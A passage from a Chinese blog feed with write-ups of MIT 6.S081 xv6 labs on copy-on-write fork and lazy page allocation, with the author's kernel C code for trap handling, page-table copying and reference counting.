class="number">15</span>)&#123;</span><br><span class="line">    uint64 va = <span class="built_in">r_stval</span>();</span><br><span class="line">    <span class="keyword">if</span> (va &gt;= MAXVA || (va &lt;= <span class="built_in">PGROUNDDOWN</span>(p-&gt;trapframe-&gt;sp) &amp;&amp; va &gt;= <span class="built_in">PGROUNDDOWN</span>(p-&gt;trapframe-&gt;sp) - PGSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检测pte的flag</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">uvmcowalloc</span>(p-&gt;pagetable, va) != <span class="number">0</span>)</span><br><span class="line">      p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">yield</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">usertrapret</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>vm：</li>
</ol>
<ul>
<li>子进程复制时，对物理内存页进行标记<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> <span class="keyword">new</span>, uint64 sz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = <span class="built_in">walk</span>(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">	</span><br><span class="line">    pa = <span class="built_in">PTE2PA</span>(*pte);</span><br><span class="line">    flags = <span class="built_in">PTE_FLAGS</span>(*pte);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// clear PTE_W and mark the page as cow page.</span></span><br><span class="line">    <span class="keyword">if</span>(flags &amp; PTE_W)&#123;</span><br><span class="line">      flags = (flags | PTE_COW) &amp; (~PTE_W);</span><br><span class="line">      *pte = <span class="built_in">PA2PTE</span>(pa) | flags;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">krefinc</span>((<span class="type">void</span>*)pa);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">mappages</span>(<span class="keyword">new</span>, i, PGSIZE, pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  <span class="built_in">uvmunmap</span>(<span class="keyword">new</span>, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>检测是否为<code>cow page</code>,如果是<code>cow page</code>则申请新的物理页，加进来。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">uvmcowalloc</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 pa;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (va &gt;= MAXVA) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  va = <span class="built_in">PGROUNDDOWN</span>(va);</span><br><span class="line">  pte = <span class="built_in">walk</span>(pagetable, va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (pte == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  pa = <span class="built_in">PTE2PA</span>(*pte);</span><br><span class="line">  <span class="keyword">if</span> (pa == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  flags = <span class="built_in">PTE_FLAGS</span>(*pte);</span><br><span class="line">  <span class="keyword">if</span> (flags &amp; PTE_COW)&#123;  </span><br><span class="line">    flags = (flags &amp; ~PTE_COW) | PTE_W;</span><br><span class="line">    <span class="type">char</span> *ka = <span class="built_in">kalloc</span>();</span><br><span class="line">    <span class="keyword">if</span> (ka == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">memmove</span>(ka, (<span class="type">char</span>*)pa, PGSIZE);</span><br><span class="line">    <span class="built_in">kfree</span>((<span class="type">void</span>*)pa);</span><br><span class="line">    *pte = <span class="built_in">PA2PTE</span>((uint64)ka) | flags;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>copyout</code>:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">copyout</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 dstva, <span class="type">char</span> *src, uint64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = <span class="built_in">PGROUNDDOWN</span>(dstva);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">uvmcowalloc</span>(pagetable, va0) != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    pa0 = <span class="built_in">walkaddr</span>(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    <span class="built_in">memmove</span>((<span class="type">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>kalloc</code>函数处理：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">uint32 <span class="title">krefcount</span><span class="params">(<span class="type">void</span> *pa)</span></span>&#123;</span><br><span class="line">	uint32 ret = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">acquire</span>(&amp;kmem.lock);</span><br><span class="line">	ret = kmem.refcount[<span class="built_in">PA2IDX</span>(pa)];</span><br><span class="line">	<span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">krefinc</span><span class="params">(<span class="type">void</span> *pa)</span></span>&#123;</span><br><span class="line">	<span class="built_in">acquire</span>(&amp;kmem.lock);</span><br><span class="line">	kmem.refcount[<span class="built_in">PA2IDX</span>(pa)]++;</span><br><span class="line">	<span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">krefdec</span><span class="params">(<span class="type">void</span> *pa)</span></span>&#123;</span><br><span class="line">	<span class="built_in">acquire</span>(&amp;kmem.lock);</span><br><span class="line">	kmem.refcount[<span class="built_in">PA2IDX</span>(pa)]--;</span><br><span class="line">	<span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ul>
<li>当我们遇到<code>fork</code>时我们如何处理？</li>
<li><ul>
<li>我们依次拷贝父进程的所有虚拟地址空间，同时将子进程的虚拟地址全部隐射到父进程的物理页面，并同时将父进程和子进程的页面全部标记为<code>cow page</code>。假设父进程的页面已经全部都为<code>cow page</code>,则此时我们只需要设置子进程的页面标志即可。</li>
</ul>
</li>
<li>当父进程或子进程写<code>cow page</code>时，我们如何处理？</li>
<li><ul>
<li>父进程或子进程写<code>cow page</code>时，我们直接申请一个新的物理页，并将虚拟地址映射到新的物理页上即可。</li>
</ul>
</li>
<li>引用计数的数组长度？</li>
<li><ul>
<li>引用数组，如果直接选择的话，实际上我们可以选择长度为$\frac{PHYSTOP}{4096}$。但是实际上没有必要，实际上我们可以看到大于$kernelbase$以上的高地址位都被内核给占用了，不会分配给用户进程，实际上这些物理页面被分配后，永远不会再被别的进程占用和分配。因此实际上我们的长度可以设定为$\frac{PHYSTOP-KERNELBASE}{4096}$.</li>
</ul>
</li>
<li>为什么我们需要处理<code>copy out</code>?</li>
<li><code>cow page</code>写入时如何处理？</li>
<li><ul>
<li><code>cow page</code>写入时会发生<code>trap</code>，因为此时该物理页并没有写入的标志，此时我们则需要捕获<code>trap</code>，然后进行处理。</li>
</ul>
</li>
<li>当<code>cow page</code>被子进程复制时，如何处理?</li>
<li><ul>
<li>我们直接进行将地址进行映射。</li>
</ul>
</li>
<li>当前<code>cow page</code>的引用计数？</li>
<li><ul>
<li>当<code>cow page</code>的<code>reference</code>大于<code>1</code>时，则我们可以知道该页面可能被多个进程映射，则此时我们按照正常的<code>cow page</code>处理即可。</li>
</ul>
</li>
<li><ul>
<li>当<code>cow page</code>的<code>reference</code>等于<code>1</code>时，则我们可以知道该页面只被一个进程映射，则此时我们可以还是按照正常的进程申请物理页面然后映射；其实我们还有另一种办法，直接恢复该页面的标记，将该物理页面标记为正常的页面，可读可写即可。</li>
</ul>
</li>
<li><ul>
<li>我们进行<code>kfree</code>时，会对引用计数减一操作，引用计数如果大于<code>1</code>时，则我们此时不做任何操作。当<code>reference</code>等于<code>0</code>时，则我们可以知道该页面未被任何一个进程引用，则可以对其进行释放。</li>
</ul>
</li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】 lab5 lazy alloaction</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/61/</url>
    <content><![CDATA[<h1 id="lazy-alloaction"><a href="#lazy-alloaction" class="headerlink" title="lazy alloaction"></a>lazy alloaction</h1><p>感觉这个<code>lab</code>是最近感觉最容易的<code>lab</code>了，只花了一天就完成了<code>lab</code>，还是感谢网络资源，感谢各位后浪们的付出，将课件翻译成中文版，翻译的质量很好，通过阅读<code>lecture</code>即可很快的熟悉相关的<code>lazy allocation</code>的原理描述，利用<code>trap</code>来实现。我们再来仔细看一下<code>trap</code>的原理：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中断现场-&gt;保存现场-&gt; 处理trap -&gt;恢复现场-&gt;恢复运行</span><br></pre></td></tr></table></figure>
<p>利用<code>trap</code>我们可以进行相关的指令跳转，来执行我们需要的操作，执行完成之后，我们再恢复指令重新执行。所以我们可以利用<code>trap</code>来进行<code>lazy allocation</code>.按需申请物理内存资源，我们在申请内存时，可以先对只对该虚拟地址<code>va</code>进行标记，如果实际的程序需要进行访问该<code>va</code>时，我们再申请实际的物理内存页进行映射，映射完成后我们再恢复指令运行。<br><a href="https://github.com/mike-box/MIT6.S081/tree/main/lab-lazy-handin">git repo</a></p>
<h2 id="Eliminate-allocation-from-sbrk"><a href="#Eliminate-allocation-from-sbrk" class="headerlink" title="Eliminate allocation from sbrk"></a>Eliminate allocation from sbrk</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your first task is to delete page allocation from the sbrk(n) system call implementation, which is the function sys_sbrk() in sysproc.c. The sbrk(n) system call grows the process&#x27;s memory size by n bytes, and then returns the start of the newly allocated region (i.e., the old size). Your new sbrk(n) should just increment the process&#x27;s size (myproc()-&gt;sz) by n and return the old size. It should not allocate memory -- so you should delete the call to growproc() (but you still need to increase the process&#x27;s size!).</span><br></pre></td></tr></table></figure>
<p>这个非常容易实现，我们只需要在<code>sys_sbrk</code>函数内部对地址进行标记，标记该进程已经拥有该地址空间即可。<br>我们可以仔细分析一下内存<br><img src="https://i.loli.net/2021/08/24/OoGUsINFqVa62cy.png"><br>我们可以看到代码实现如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sbrk</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> * p = <span class="built_in">myproc</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">argint</span>(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  addr = p-&gt;sz;</span><br><span class="line">  <span class="keyword">if</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">  	<span class="keyword">if</span>(p-&gt;sz + n &gt; MAXVA) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  	p-&gt;sz += n;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">growproc</span>(n) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Lazy-allocation"><a href="#Lazy-allocation" class="headerlink" title="Lazy allocation"></a>Lazy allocation</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Modify the code in trap.c to respond to a page fault from user space by mapping a newly-allocated page of physical memory at the faulting address, and then returning back to user space to let the process continue executing. You should add your code just before the printf call that produced the &quot;usertrap(): ...&quot; message. Modify whatever other xv6 kernel code you need to in order to get echo hi to work.</span><br></pre></td></tr></table></figure>
<ul>
<li>实现在发生<code>trap</code>时我们时，我们首先判断发生<code>trap</code>时的地址是否合法，如果合法则我们认为该内存是<code>lazy allocation</code>，此时我们就<code>kalloc</code>一页实际的物理内存，然后进行映射，映射完成后，我们将<code>trap</code>恢复时执行的指令地址设置为$sepc$寄存器中的地址，CPU会从再次从发生<code>trap</code>的指令处开始执行。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">usertrap</span>(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((<span class="built_in">r_sstatus</span>() &amp; SSTATUS_SPP) != <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;usertrap: not from user mode&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send interrupts and exceptions to kerneltrap(),</span></span><br><span class="line">  <span class="comment">// since we&#x27;re now in the kernel.</span></span><br><span class="line">  <span class="built_in">w_stvec</span>((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// save user program counter.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = <span class="built_in">r_sepc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">r_scause</span>() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// system call</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sepc points to the ecall instruction,</span></span><br><span class="line">    <span class="comment">// but we want to return to the next instruction.</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// an interrupt will change sstatus &amp;c registers,</span></span><br><span class="line">    <span class="comment">// so don&#x27;t enable until done with those registers.</span></span><br><span class="line">    <span class="built_in">intr_on</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">syscall</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = <span class="built_in">devintr</span>()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// ok</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    uint64 pcode = <span class="built_in">r_scause</span>();</span><br><span class="line">	uint64 va = <span class="built_in">r_stval</span>();</span><br><span class="line">	uint64 epc = <span class="built_in">r_sepc</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// page fault, valid virtual address, 记录trap发生的原因</span></span><br><span class="line">  	<span class="keyword">if</span>(pcode == <span class="number">15</span> || pcode == <span class="number">13</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(va &gt;= p-&gt;sz || va &lt;= p-&gt;trapframe-&gt;sp || va &gt; MAXVA)&#123;</span><br><span class="line">			p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// alloc a page</span></span><br><span class="line">		<span class="type">char</span> *mem = <span class="built_in">kalloc</span>();		</span><br><span class="line">	    <span class="keyword">if</span>(mem == <span class="number">0</span>)&#123;</span><br><span class="line">	        p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">	    &#125;</span><br><span class="line">		<span class="built_in">memset</span>(mem,<span class="number">0</span>,PGSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mapper a page for va</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">mappages</span>(p-&gt;pagetable,<span class="built_in">PGROUNDDOWN</span>(va),PGSIZE,(uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">kfree</span>(mem);</span><br><span class="line">			p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// restore epc</span></span><br><span class="line">		p-&gt;trapframe-&gt;epc = epc;  </span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;usertrap(): unexpected scause %p pid=%d\n&quot;</span>, <span class="built_in">r_scause</span>(), p-&gt;pid);</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">&quot;            sepc=%p stval=%p\n&quot;</span>, <span class="built_in">r_sepc</span>(), <span class="built_in">r_stval</span>());</span><br><span class="line">	    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;killed)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">yield</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">usertrapret</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>修改<code>uvmunmap</code>时，我们在页表中<code>walk</code>时一旦发现该<code>virtual address</code>无法找到对应的物理页时，则我们此时直接跳过，而不是直接<code>panic</code>。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Remove npages of mappings starting from va. va must be</span></span><br><span class="line"><span class="comment">// page-aligned. The mappings must exist.</span></span><br><span class="line"><span class="comment">// Optionally free the physical memory.</span></span><br><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">uvmunmap</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va, uint64 npages, <span class="type">int</span> do_free)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 a;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((va % PGSIZE) != <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;uvmunmap: not aligned&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(a = va; a &lt; va + npages*PGSIZE; a += PGSIZE)&#123;</span><br><span class="line">    <span class="comment">// 未找到该地址</span></span><br><span class="line">    <span class="keyword">if</span>((pte = <span class="built_in">walk</span>(pagetable, a, <span class="number">0</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">	     <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">PTE_FLAGS</span>(*pte) == PTE_V)</span><br><span class="line">      <span class="built_in">panic</span>(<span class="string">&quot;uvmunmap: not a leaf&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(do_free)&#123;</span><br><span class="line">      uint64 pa = <span class="built_in">PTE2PA</span>(*pte);</span><br><span class="line">      <span class="built_in">kfree</span>((<span class="type">void</span>*)pa);</span><br><span class="line">    &#125;</span><br><span class="line">    *pte = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Lazytests-and-Usertests"><a href="#Lazytests-and-Usertests" class="headerlink" title="Lazytests and Usertests"></a>Lazytests and Usertests</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">We&#x27;ve supplied you with lazytests, an xv6 user program that tests some specific situations that may stress your lazy memory allocator. Modify your kernel code so that all of both lazytests and usertests pass.</span><br><span class="line">Handle negative sbrk() arguments.</span><br><span class="line">Kill a process if it page-faults on a virtual memory address higher than any allocated with sbrk().</span><br><span class="line">Handle the parent-to-child memory copy in fork() correctly.</span><br><span class="line">Handle the case in which a process passes a valid address from sbrk() to a system call such as read or write, but the memory for that address has not yet been allocated.</span><br><span class="line">Handle out-of-memory correctly: if kalloc() fails in the page fault handler, kill the current process.</span><br><span class="line">Handle faults on the invalid page below the user stack.</span><br></pre></td></tr></table></figure>
<ul>
<li>我们发现在进行<code>usertests</code>，<code>sbrkarg</code>这个测试结果一直过不了，页没有报<code>usertrap</code>的错误，仔细跟踪了一下代码，发现它是调用了<code>sys_write</code>操作，而<code>sys_write</code>最终调用了<code>copyin</code>的操作，仔细检查一下<code>copyin</code>的函数发现它是直接在页表中读取操作，<code>walkaddr</code>时报错，所以直接返回<code>-1</code>。所以我们需要修改<code>walkaddr</code>函数，我们发现当前的地址没有在页表中找到时，则取申请一页新的物理页，然后将其映射到新的物理地址中。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">walkaddr</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 va)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(va &gt;= MAXVA)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  pte = <span class="built_in">walk</span>(pagetable, va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(pte == <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)&#123;</span><br><span class="line">  	<span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">	<span class="keyword">if</span>(va &gt;= p-&gt;sz) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">  <span class="comment">// malloc a new page</span></span><br><span class="line">	<span class="type">char</span> *mem = <span class="built_in">kalloc</span>();</span><br><span class="line">	<span class="keyword">if</span>(mem == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// map a page for the new address</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">mappages</span>(pagetable,<span class="built_in">PGROUNDDOWN</span>(va),PGSIZE,(uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">kfree</span>(mem);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">return</span> (uint64)mem;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>((*pte &amp; PTE_U) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pa = <span class="built_in">PTE2PA</span>(*pte);</span><br><span class="line">  <span class="keyword">return</span> pa;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>我们最后还需要注意的提示：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Handle faults on the invalid page below the user stack.</span><br></pre></td></tr></table></figure>
我们首先看一下系统用户进程的栈空间分布？<br>我们知道在栈的空件是从高地址往低地址增长的，如果我们发现栈的空间大小一个<code>page</code>，栈的地址空间为<code>1~4096</code>,因为所有的进程都是用户初始化进程的子进程，在子进程复制时，同时会复制父进程的栈空间。我们在进行<code>sbrk</code>操作时，实际扩充的进程的<code>heap</code>.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">userinit</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p;</span><br><span class="line"></span><br><span class="line">  p = <span class="built_in">allocproc</span>();</span><br><span class="line">  initproc = p;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// allocate one user page and copy init&#x27;s instructions</span></span><br><span class="line">  <span class="comment">// and data into it.</span></span><br><span class="line">  <span class="built_in">uvminit</span>(p-&gt;pagetable, initcode, <span class="built_in">sizeof</span>(initcode));</span><br><span class="line">  p-&gt;sz = PGSIZE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prepare for the very first &quot;return&quot; from kernel to user.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = <span class="number">0</span>;      <span class="comment">// user program counter</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = PGSIZE;  <span class="comment">// user stack pointer</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">safestrcpy</span>(p-&gt;name, <span class="string">&quot;initcode&quot;</span>, <span class="built_in">sizeof</span>(p-&gt;name));</span><br><span class="line">  p-&gt;cwd = <span class="built_in">namei</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p-&gt;state = RUNNABLE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>Handle faults on the invalid page below the user stack.</code></li>
</ul>
<ol>
